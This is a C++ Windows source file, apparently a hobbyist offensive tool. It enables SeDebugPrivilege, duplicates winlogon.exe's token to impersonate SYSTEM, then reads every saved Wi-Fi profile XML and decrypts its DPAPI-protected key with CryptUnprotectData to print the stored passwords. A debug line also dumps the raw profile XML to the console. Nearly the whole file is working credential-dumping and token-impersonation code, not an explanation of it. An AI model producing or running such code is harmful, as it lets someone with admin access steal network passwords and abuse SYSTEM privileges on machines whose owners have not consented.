#include<Windows.h>
#include<wincrypt.h>
#include<TlHelp32.h>
#include<cstdio>
#pragma comment(lib, "crypt32.lib")

//
// ============================================================
//  DPAPI wifi profile decryption.
//  Profiles live at:
//  C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\{profile}.xml
//
//  The <keyMaterial> tag inside each XML is DPAPI-encrypted
//  when protected=true. CryptUnprotectData decrypts it.
//
//  Requires SYSTEM privileges — the blobs were encrypted
//  by SYSTEM and can only be decrypted in that context.
//  we duplicate tokens and imprestonate, needs admin.
//  this code has little to benefit lol, id recommend just using
//  extract.cpp
// ============================================================
//

#define WLAN_PROFILES_PATH \
    L"C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\"

typedef struct _WIFI_PROFILE_DATA {
    WCHAR ProfilePath[MAX_PATH];
    WCHAR XmlDecrypted[8192];
    BOOL  WasEncrypted;
} WIFI_PROFILE_DATA, * PWIFI_PROFILE_DATA;

VOID
ExtractXmlValue(
    _In_  LPCWSTR Xml,
    _In_  LPCWSTR Tag,
    _Out_ WCHAR* OutBuffer,
    _In_  DWORD   BufferSize
)
{
    WCHAR OpenTag[128] = { 0 };
    WCHAR CloseTag[128] = { 0 };

    wsprintfW(OpenTag, L"<%s>", Tag);
    wsprintfW(CloseTag, L"</%s>", Tag);

    LPCWSTR Start = wcsstr(Xml, OpenTag);
    if (Start == NULL)
    {
        lstrcpyW(OutBuffer, L"<not found>");
        return;
    }

    Start += lstrlenW(OpenTag);

    LPCWSTR End = wcsstr(Start, CloseTag);
    if (End == NULL)
    {
        lstrcpyW(OutBuffer, L"<not found>");
        return;
    }

    DWORD Length = (DWORD)(End - Start);
    if (Length >= BufferSize) Length = BufferSize - 1;

    RtlCopyMemory(OutBuffer, Start, Length * sizeof(WCHAR));
    OutBuffer[Length] = L'\0';
}

BOOL
ImpersonateSystem(
    VOID
)
{
    //
    // Find winlogon.exe — it always runs as SYSTEM.
    //
    HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Snapshot == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    PROCESSENTRY32W Entry = { 0 };
    Entry.dwSize = sizeof(Entry);

    DWORD WinlogonPid = 0;

    while (Process32NextW(Snapshot, &Entry))
    {
        if (lstrcmpiW(Entry.szExeFile, L"winlogon.exe") == 0)
        {
            WinlogonPid = Entry.th32ProcessID;
            break;
        }
    }

    CloseHandle(Snapshot);

    if (WinlogonPid == 0)
    {
        printf("[-] winlogon.exe not found\n");
        return FALSE;
    }

    //
    // Open winlogon with TOKEN privileges.
    //
    CONST HANDLE ProcessHandle = OpenProcess(
        PROCESS_QUERY_INFORMATION,
        FALSE,
        WinlogonPid
    );

    if (ProcessHandle == NULL)
    {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        printf("[*] Run as Administrator first\n");
        return FALSE;
    }

    HANDLE Token = NULL;

    if (!OpenProcessToken(ProcessHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &Token))
    {
        printf("[-] OpenProcessToken failed: %d\n", GetLastError());
        CloseHandle(ProcessHandle);
        return FALSE;
    }

    HANDLE DuplicatedToken = NULL;

    //
    // Duplicate as impersonation token — required for SetThreadToken.
    //
    if (!DuplicateTokenEx(
        Token,
        TOKEN_ALL_ACCESS,
        NULL,
        SecurityImpersonation,
        TokenImpersonation,
        &DuplicatedToken))
    {
        printf("[-] DuplicateTokenEx failed: %d\n", GetLastError());
        CloseHandle(Token);
        CloseHandle(ProcessHandle);
        return FALSE;
    }

    //
    // Impersonate SYSTEM on the current thread.
    //
    if (!SetThreadToken(NULL, DuplicatedToken))
    {
        printf("[-] SetThreadToken failed: %d\n", GetLastError());
        CloseHandle(DuplicatedToken);
        CloseHandle(Token);
        CloseHandle(ProcessHandle);
        return FALSE;
    }

    CloseHandle(DuplicatedToken);
    CloseHandle(Token);
    CloseHandle(ProcessHandle);

    printf("[+] Impersonating SYSTEM via winlogon.exe\n");
    return TRUE;
}

BOOL
ReadFileToBuffer(
    _In_  LPCWSTR FilePath,
    _Out_ LPWSTR* OutBuffer,
    _Out_ PDWORD  OutSize
)
{
    CONST HANDLE FileHandle = CreateFileW(
        FilePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (FileHandle == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    CONST DWORD FileSize = GetFileSize(FileHandle, NULL);

    PBYTE RawBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, FileSize + 2);

    DWORD BytesRead = 0;
    ReadFile(FileHandle, RawBuffer, FileSize, &BytesRead, NULL);
    CloseHandle(FileHandle);

    //
    // File is UTF-8 — convert to UTF-16 for wcsstr/wsprintfW compatibility.
    //
    CONST INT WideLen = MultiByteToWideChar(
        CP_UTF8,
        0,
        (LPCCH)RawBuffer,
        BytesRead,
        NULL,
        0
    );

    LPWSTR WideBuffer = (LPWSTR)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        (WideLen + 1) * sizeof(WCHAR)
    );

    MultiByteToWideChar(
        CP_UTF8,
        0,
        (LPCCH)RawBuffer,
        BytesRead,
        WideBuffer,
        WideLen
    );

    WideBuffer[WideLen] = L'\0';

    HeapFree(GetProcessHeap(), 0, RawBuffer);

    *OutBuffer = WideBuffer;
    *OutSize = WideLen;
    return TRUE;
}


BOOL
DecryptDpapiHex(
    _In_  LPCWSTR EncryptedHex,
    _Out_ WCHAR*  OutPlaintext,
    _In_  DWORD   OutSize
    )
{
    DWORD BinaryLen = 0;

    if ( !CryptStringToBinaryW(
            EncryptedHex,
            0,
            CRYPT_STRING_HEX,
            NULL,
            &BinaryLen,
            NULL, NULL ) )
    {
        printf( "[-] CryptStringToBinaryW failed: %d\n", GetLastError( ) );
        return FALSE;
    }

    PBYTE BinaryBlob = ( PBYTE )HeapAlloc( GetProcessHeap( ), HEAP_ZERO_MEMORY, BinaryLen );

    CryptStringToBinaryW(
        EncryptedHex,
        0,
        CRYPT_STRING_HEX,
        BinaryBlob,
        &BinaryLen,
        NULL, NULL
    );

    DATA_BLOB InputBlob  = { BinaryLen, BinaryBlob };
    DATA_BLOB OutputBlob = { 0, NULL };

    BOOL Result = CryptUnprotectData(
        &InputBlob,
        NULL,
        NULL,
        NULL,
        NULL,
        0,
        &OutputBlob
    );

    if ( Result == TRUE && OutputBlob.pbData != NULL )
    {
        //
        // Output is a narrow (ANSI) string — convert to wide before returning.
        //
        MultiByteToWideChar(
            CP_ACP,
            0,
            ( LPCCH )OutputBlob.pbData,
            OutputBlob.cbData,
            OutPlaintext,
            OutSize - 1
        );

        OutPlaintext[ OutSize - 1 ] = L'\0';

        LocalFree( OutputBlob.pbData );
    }
    else
    {
        printf( "[-] CryptUnprotectData failed: %d\n", GetLastError( ) );
    }

    HeapFree( GetProcessHeap( ), 0, BinaryBlob );
    return Result;
}

DWORD
EnumAndDecryptWlanProfiles(
    _Out_ PWIFI_PROFILE_DATA Results,
    _In_  DWORD              MaxResults
)
{
    DWORD Count = 0;

    //
    // Enumerate interface GUIDs under the Wlansvc profiles directory.
    //
    WCHAR SearchPath[MAX_PATH] = { 0 };
    lstrcpyW(SearchPath, WLAN_PROFILES_PATH);
    lstrcatW(SearchPath, L"*");

    WIN32_FIND_DATAW FindData = { 0 };
    HANDLE           FindHandle = FindFirstFileW(SearchPath, &FindData);

    if (FindHandle == INVALID_HANDLE_VALUE)
    {
        printf("[-] FindFirstFile failed: %d\n", GetLastError());
        printf("[*] Requires SYSTEM privileges\n");
        return 0;
    }

    do
    {
        if (!(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            continue;
        }

        if (lstrcmpW(FindData.cFileName, L".") == 0 ||
            lstrcmpW(FindData.cFileName, L"..") == 0)
        {
            continue;
        }

        //
        // Each subdirectory is an interface GUID.
        // Enumerate XML profiles inside it.
        //
        WCHAR InterfacePath[MAX_PATH] = { 0 };
        wsprintfW(InterfacePath, L"%s%s\\*.xml", WLAN_PROFILES_PATH, FindData.cFileName);

        WIN32_FIND_DATAW XmlFindData = { 0 };
        HANDLE           XmlFindHandle = FindFirstFileW(InterfacePath, &XmlFindData);

        if (XmlFindHandle == INVALID_HANDLE_VALUE)
        {
            continue;
        }

        do
        {
            if (Count >= MaxResults)
            {
                break;
            }

            WCHAR XmlPath[MAX_PATH] = { 0 };
            wsprintfW(
                XmlPath,
                L"%s%s\\%s",
                WLAN_PROFILES_PATH,
                FindData.cFileName,
                XmlFindData.cFileName
            );

            LPWSTR FileBuffer = NULL;
            DWORD FileSize = 0;

            printf("[DEBUG] Reading file: %ws\n", XmlPath);

            if (!ReadFileToBuffer(XmlPath, &FileBuffer, &FileSize))
            {
                printf("[DEBUG] ReadFileToBuffer failed\n");
                continue;
            }

            printf("[DEBUG] File read successfully, size: %d bytes\n", FileSize);

            //
            // File is UTF-16 — cast directly to WCHAR.
            //
            LPCWSTR XmlWide = (LPCWSTR)FileBuffer;

            //
            // Debug — dump raw XML to console to verify content and exact tag names.
            //
            wprintf(L"=== RAW XML ===\n%s\n===============\n\n", XmlWide);

            PWIFI_PROFILE_DATA Entry = &Results[Count];
            lstrcpyW(Entry->ProfilePath, XmlPath);

            //
            // Check if the key is protected (DPAPI encrypted).
            //
            WCHAR Protected[16] = { 0 };
            ExtractXmlValue(XmlWide, L"protected", Protected, 16);

            if (lstrcmpiW(Protected, L"true") == 0)
            {
                //
                // Key is DPAPI encrypted — extract the base64 blob
                // and attempt decryption.
                //
                WCHAR KeyMaterial[1024] = { 0 };
                ExtractXmlValue(XmlWide, L"keyMaterial", KeyMaterial, 1024);

                WCHAR Plaintext[256] = { 0 };

                if (DecryptDpapiHex(KeyMaterial, Plaintext, 256))
                {
                    //
                    // Replace encrypted blob in XML with plaintext password.
                    //
                    wsprintfW(
                        Entry->XmlDecrypted,
                        L"[DECRYPTED] Password: %s",
                        Plaintext
                    );
                }
                else
                {
                    lstrcpyW(
                        Entry->XmlDecrypted,
                        L"[!] Decryption failed — run as SYSTEM"
                    );
                }

                Entry->WasEncrypted = TRUE;
            }
            else
            {
                //
                // Key is already plaintext — just extract it directly.
                //
                WCHAR KeyMaterial[256] = { 0 };
                ExtractXmlValue(XmlWide, L"keyMaterial", KeyMaterial, 256);
                wsprintfW(Entry->XmlDecrypted, L"[PLAINTEXT] Password: %s", KeyMaterial);
                Entry->WasEncrypted = FALSE;
            }

            HeapFree(GetProcessHeap(), 0, FileBuffer);
            Count++;

        } while (FindNextFileW(XmlFindHandle, &XmlFindData));

        FindClose(XmlFindHandle);

    } while (FindNextFileW(FindHandle, &FindData));

    FindClose(FindHandle);
    return Count;
}

INT
main(
    VOID
)
{
    //
    // Enable SeDebugPrivilege — required to open winlogon.exe token.
    //
    HANDLE TokenHandle = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &TokenHandle);

    TOKEN_PRIVILEGES Tp = { 0 };
    Tp.PrivilegeCount = 1;
    Tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Tp.Privileges[0].Luid);
    AdjustTokenPrivileges(TokenHandle, FALSE, &Tp, sizeof(Tp), NULL, NULL);
    CloseHandle(TokenHandle);

    //
    // Impersonate SYSTEM before attempting DPAPI decryption.
    //
    if (ImpersonateSystem() == FALSE)
    {
        printf("[-] Failed to impersonate SYSTEM\n");
        return 1;
    }

    CONST PWIFI_PROFILE_DATA Results = (PWIFI_PROFILE_DATA)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sizeof(WIFI_PROFILE_DATA) * 256
    );

    if (Results == NULL)
    {
        printf("[-] HeapAlloc failed\n");
        return 1;
    }

    CONST DWORD Count = EnumAndDecryptWlanProfiles(Results, 256);

    //
    // Revert impersonation after decryption is complete.
    //
    RevertToSelf();

    printf("[+] Found %d wifi profiles\n\n", Count);

    for (DWORD i = 0; i < Count; i++)
    {
        printf("  Profile  : %ws\n", Results[i].ProfilePath);
        printf("  Key      : %ws\n", Results[i].XmlDecrypted);
        printf("  Encrypted: %s\n", Results[i].WasEncrypted ? "Yes" : "No");
        printf("  --------------------------------\n\n");
    }

    HeapFree(GetProcessHeap(), 0, Results);
    return 0;
}
